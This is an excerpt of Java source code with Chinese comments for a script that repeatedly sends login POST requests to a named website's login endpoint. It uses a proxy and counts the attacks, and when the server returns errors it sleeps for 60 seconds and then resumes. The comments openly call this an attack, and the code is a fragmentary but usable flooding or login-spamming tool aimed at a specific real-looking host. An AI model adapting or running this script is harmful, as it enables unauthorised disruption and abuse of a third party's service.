...
// 设置http访问要使用的代理服务器的密码
                ...
                String content = "username=" + URLEncoder.encode("sdas123489", "UTF-8");
                ...
                reader.close();
               /* if ("<script>location.replace('index.php?')</script>".equals(line)) {
                    System.out.println();
                }*/
                //该干的都干完了,记得把连接断了
                connection.disconnect();
                numL++;
                System.out.println("当前次数" + numL);
            } catch (IOException e) {
                // e.printStackTrace();
                try {
                    System.out.println("503,攻击异常，开始休眠，当前攻击次数" + numL);
                    Thread.sleep(60000);
                    System.out.println("休眠结束继续攻击");
    ...
    public static void main(String[] args) throws IOException {
        ...
        //攻击地址
        strUrl = "https://www.supmers.com/trans.php?action=login";
        System.out.println("--------------------------------------");
